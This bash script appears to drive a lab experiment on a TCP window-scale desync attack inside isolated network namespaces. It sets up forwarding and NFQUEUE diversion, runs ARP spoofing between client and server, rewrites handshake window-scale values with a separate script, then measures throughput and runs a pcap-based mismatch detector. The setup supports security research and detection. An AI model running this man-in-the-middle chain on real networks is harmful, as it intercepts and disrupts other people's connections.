#!/usr/bin/env bash
# Runs the full desync attack end to end: gain MITM (ARP spoof) -> divert (NFQUEUE) ->
# rewrite (wscale_attack.py) -> measure (bulk transfer) -> analyze (pcap detector).
# This is Implementation Plan steps 2-5 chained together.
#
# Usage: measure/run_attack.sh [new_shift] [target] [client_rcvbuf]
#   new_shift     : 0-14, the shift forced onto the tampered packet (default 0 = deflate)
#   target        : client-syn | server-synack | both            (default client-syn)
#   client_rcvbuf : bytes -- pins the client's REAL receive buffer and disables Linux's
#                   autotuning. Needed to actually observe the inflate (0->14) overrun:
#                   on a fast/short-lived link the autotuned buffer grows large enough
#                   that the server's inflated belief never overruns it, so nothing
#                   visibly breaks. Leave unset for the deflate case. Example: 65536
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUTDIR="$ROOT/captures/attack"
mkdir -p "$OUTDIR"

if [[ $EUID -ne 0 ]]; then
    echo "[!] Run as root (sudo)." >&2
    exit 1
fi

NEW_SHIFT="${1:-0}"
TARGET="${2:-client-syn}"
CLIENT_RCVBUF="${3:-}"

# Killing these by tracked PID + `wait` turned out unreliable in practice (NFQUEUE's
# run() blocks in a C recv loop that doesn't reliably honor SIGTERM, and `wait` on a
# background job started through `ip netns exec ... &` was observed to hang indefinitely
# rather than just being slow). Kill by process pattern instead -- no `wait` involved,
# so there's nothing for this step to hang on.
stop_background() {
    # SIGTERM to arp_spoof.py first so it gets a chance to restore the real ARP entries.
    pkill -TERM -f "attacker/arp_spoof.py" 2>/dev/null || true
    sleep 1
    pkill -9 -f "attacker/arp_spoof.py" 2>/dev/null || true
    pkill -9 -f "attacker/wscale_attack.py" 2>/dev/null || true
    pkill -9 -f "tcpdump -i wscale-br0" 2>/dev/null || true
    sleep 0.5
}

cleanup() {
    echo "[*] Cleaning up background processes / rules..."
    stop_background
    ip netns exec wscale-attacker bash "$ROOT/attacker/divert_rules.sh" teardown 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Tuning attacker namespace networking (ip_forward on, redirects/rp_filter off)"
ip netns exec wscale-attacker sysctl -w net.ipv4.ip_forward=1 >/dev/null
ip netns exec wscale-attacker sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null
ip netns exec wscale-attacker sysctl -w net.ipv4.conf.eth0.send_redirects=0 >/dev/null
ip netns exec wscale-attacker sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1 || true
ip netns exec wscale-attacker sysctl -w net.ipv4.conf.eth0.rp_filter=0 >/dev/null 2>&1 || true

echo "[*] Installing NFQUEUE divert rule"
ip netns exec wscale-attacker bash "$ROOT/attacker/divert_rules.sh" setup

echo "[*] Starting ARP spoof (client <-> server) from the attacker namespace"
ip netns exec wscale-attacker python3 "$ROOT/attacker/arp_spoof.py" \
    --iface eth0 --client-ip 10.0.0.1 --server-ip 10.0.0.2 &
ARP_PID=$!
sleep 2

echo "[*] Starting wscale_attack.py (new_shift=$NEW_SHIFT target=$TARGET)"
ip netns exec wscale-attacker python3 "$ROOT/attacker/wscale_attack.py" \
    --queue-num 0 --new-shift "$NEW_SHIFT" --target "$TARGET" --client-ip 10.0.0.1 \
    >"$OUTDIR/wscale_attack.log" 2>&1 &
NFQ_PID=$!
sleep 1

echo "[*] Capturing on wscale-br0 during the attack"
# -c 2000 is plenty: the handshake we care about is the first few packets, and a
# desynced connection can legitimately balloon into hundreds of thousands of tiny
# (sub-MSS) segments -- each doubled by the MITM's two-hop forwarding -- for the rest
# of a 20MB transfer, which makes scapy's pure-Python rdpcap() parse for a very long
# time without adding any evidence detect_wscale_mismatch.py actually needs.
tcpdump -i wscale-br0 -w "$OUTDIR/handshake.pcap" -U -c 2000 &
TCPDUMP_PID=$!
sleep 1

ip netns exec wscale-server python3 "$ROOT/throughput/bulk_server.py" \
    --host 0.0.0.0 --port 9000 --once --stats-out "$OUTDIR/server_stats.json" &
SERVER_PID=$!
sleep 1

RCVBUF_ARGS=()
if [[ -n "$CLIENT_RCVBUF" ]]; then
    echo "[*] Pinning client real rcvbuf to $CLIENT_RCVBUF bytes (autotuning disabled)"
    RCVBUF_ARGS=(--rcvbuf "$CLIENT_RCVBUF")
fi

ip netns exec wscale-client python3 "$ROOT/throughput/bulk_client.py" \
    --host 10.0.0.2 --port 9000 --stats-out "$OUTDIR/client_stats.json" "${RCVBUF_ARGS[@]}" || true

wait "$SERVER_PID" 2>/dev/null || true

echo "[*] Transfer done -- stopping capture and MITM before analysis"
stop_background
ip netns exec wscale-attacker bash "$ROOT/attacker/divert_rules.sh" teardown 2>/dev/null || true

# Keep a per-run copy so a later run (e.g. trying the other shift value) doesn't
# clobber this evidence -- handshake.pcap itself stays as the "latest run" for the
# compare/detect commands below.
RUN_TAG="shift${NEW_SHIFT}_${TARGET}_$(date +%H%M%S)"
cp "$OUTDIR/handshake.pcap" "$OUTDIR/handshake_${RUN_TAG}.pcap" 2>/dev/null || true
cp "$OUTDIR/client_stats.json" "$OUTDIR/client_stats_${RUN_TAG}.json" 2>/dev/null || true
cp "$OUTDIR/server_stats.json" "$OUTDIR/server_stats_${RUN_TAG}.json" 2>/dev/null || true
echo "[*] Saved a per-run copy as ${RUN_TAG} (won't be overwritten by future runs)"

echo "[*] Attack run complete. Results in $OUTDIR"
echo "[*] --- wscale_attack.py rewrite log ---"
cat "$OUTDIR/wscale_attack.log" || true
echo "[*] ---------------------------------"

python3 "$ROOT/measure/compare.py" --baseline-dir "$ROOT/captures/baseline" --attack-dir "$OUTDIR"
python3 "$ROOT/analysis/detect_wscale_mismatch.py" "$OUTDIR/handshake.pcap"
